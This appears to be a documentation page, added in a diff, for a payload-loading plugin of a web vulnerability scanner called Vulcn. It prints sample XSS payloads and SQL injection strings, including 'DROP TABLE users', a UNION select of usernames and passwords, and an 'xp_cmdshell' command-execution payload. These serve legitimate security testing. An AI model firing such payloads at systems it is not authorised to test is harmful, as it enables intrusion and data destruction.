@@ -1,0 +1,224 @@
+---
+title: "@vulcn/plugin-payloads"
+description: "Official payload loading plugin"
+---
+
+## Overview
+
+The payloads plugin handles all payload loading for Vulcn:
+
+- **Built-in payloads** - 13 payload sets, 91 individual payloads
+- **PayloadsAllTheThings** - Fetch from the popular repository
+- **Custom files** - Load your own YAML/JSON payload files
+
+## Installation
+
+The plugin is included with the CLI and loaded automatically.
+
+```bash
+npm install @vulcn/plugin-payloads
+```
+
+## Configuration
+
+```yaml
+plugins:
+  - name: "@vulcn/plugin-payloads"
+    config:
+      builtin: true
+      include:
+        - xss-basic
+        - sqli-basic
+      exclude:
+        - xss-polyglot
+      payloadbox:
+        - xss
+        - sql-injection
+      files:
+        - ./custom-payloads.yml
+```
+
+## Options
+
+| Option       | Type     | Default | Description                     |
+| ------------ | -------- | ------- | ------------------------------- |
+| `builtin`    | boolean  | `true`  | Include built-in payloads       |
+| `include`    | string[] | -       | Only include these payload sets |
+| `exclude`    | string[] | -       | Exclude these payload sets      |
+| `payloadbox` | string[] | -       | Fetch from PayloadsAllTheThings |
+| `files`      | string[] | -       | Custom payload file paths       |
+
+## Built-in Payload Sets
+
+### XSS Payloads
+
+<AccordionGroup>
+  <Accordion title="xss-basic (15 payloads)">
+    Basic XSS payloads with script tags and simple event handlers:
+    
+    ```
+    <script>alert('XSS')</script>
+    <script>alert(1)</script>
+    <script>alert(document.domain)</script>
+    <img src=x onerror=alert('XSS')>
+    <svg onload=alert('XSS')>
+    ...
+    ```
+  </Accordion>
+  
+  <Accordion title="xss-event (12 payloads)">
+    Event handler payloads:
+    
+    ```
+    <body onload=alert('XSS')>
+    <div onmouseover=alert('XSS')>hover</div>
+    <input onfocus=alert('XSS') autofocus>
+    <marquee onstart=alert('XSS')>
+    ...
+    ```
+  </Accordion>
+  
+  <Accordion title="xss-svg (8 payloads)">
+    SVG-based XSS payloads:
+    
+    ```
+    <svg onload=alert('XSS')>
+    <svg/onload=alert('XSS')>
+    <svg><script>alert('XSS')</script></svg>
+    ...
+    ```
+  </Accordion>
+  
+  <Accordion title="xss-polyglot (5 payloads)">
+    Polyglot payloads that work in multiple contexts:
+    
+    ```
+    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )/
+    ...
+    ```
+  </Accordion>
+</AccordionGroup>
+
+### SQL Injection Payloads
+
+<AccordionGroup>
+  <Accordion title="sqli-basic (10 payloads)">
+    Basic SQL injection payloads: ``` ' OR '1'='1 ' OR '1'='1' -- " OR "1"="1 1'
+    OR '1'='1 1; DROP TABLE users-- ... ```
+  </Accordion>
+
+  <Accordion title="sqli-error (8 payloads)">
+    Error-based SQL injection: ``` ' AND 1=CONVERT(int,@@version)-- ' AND
+    extractvalue(1,concat(0x7e,version()))-- ... ```
+  </Accordion>
+
+  <Accordion title="sqli-blind (6 payloads)">
+    Blind SQL injection (time-based): ``` ' AND SLEEP(5)-- ' AND 1=1 AND
+    SLEEP(5)-- 1' AND (SELECT SLEEP(5))-- ... ```
+  </Accordion>
+
+  <Accordion title="sqli-union (5 payloads)">
+    UNION-based SQL injection: ``` ' UNION SELECT NULL-- ' UNION SELECT
+    NULL,NULL-- ' UNION SELECT username,password FROM users-- ... ```
+  </Accordion>
+</AccordionGroup>
+
+### Other Payloads
+
+| Set              | Count | Description                 |
+| ---------------- | ----- | --------------------------- |
+| `ssrf-basic`     | 5     | Server-Side Request Forgery |
+| `xxe-basic`      | 4     | XML External Entity         |
+| `cmd-basic`      | 6     | Command injection           |
+| `path-traversal` | 8     | Directory traversal         |
+| `open-redirect`  | 4     | Open redirect               |
+
+## PayloadsAllTheThings
+
+Fetch payloads from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings):
+
+```yaml
+payloadbox:
+  - xss
+  - sql-injection
+  - xxe
+  - command-injection
+  - open-redirect
+  - path-traversal
+```
+
+Available types:
+
+| Type                | Description                |
+| ------------------- | -------------------------- |
+| `xss`               | XSS payloads               |
+| `sql-injection`     | SQL injection payloads     |
+| `xxe`               | XXE payloads               |
+| `command-injection` | Command injection payloads |
+| `open-redirect`     | Open redirect payloads     |
+| `path-traversal`    | Path traversal payloads    |
+
+## Custom Payload Files
+
+Create your own payload files:
+
+```yaml
+# custom-payloads.yml
+version: "1"
+payloads:
+  - name: my-xss-payloads
+    category: xss
+    description: Custom XSS for our app
+    payloads:
+      - "<script>alert('custom')</script>"
+      - "<img src=x onerror=alert('custom')>"
+    detectPatterns:
+      - "alert\\('custom'\\)"
+
+  - name: my-sqli-payloads
+    category: sqli
+    description: Database-specific SQLi
+    payloads:
+      - "'; EXEC xp_cmdshell('whoami')--"
+      - "1; SELECT pg_sleep(5)--"
+```
+
+Load in config:
+
+```yaml
+plugins:
+  - name: "@vulcn/plugin-payloads"
+    config:
+      files:
+        - ./custom-payloads.yml
+```
+
+Or via CLI:
+
+```bash
+vulcn run session.vulcn.yml --payload-file ./custom-payloads.yml
+```
+
+## Programmatic Usage
+
+```typescript
+import {
+  BUILTIN_PAYLOADS,
+  loadPayloadBox,
+  loadFromFile,
+  getPayloadBoxTypes,
+} from "@vulcn/plugin-payloads";
+
+// Get all built-in payloads
+const xssBasic = BUILTIN_PAYLOADS["xss-basic"];
+
+// Fetch from PayloadsAllTheThings
+const xssPayloads = await loadPayloadBox("xss", 50);
+
+// Load from file
+const customPayloads = await loadFromFile("./my-payloads.yml");
+
+// List available PayloadBox types
+const types = getPayloadBoxTypes();
+// ["xss", "sql-injection", "xxe", ...]
+```
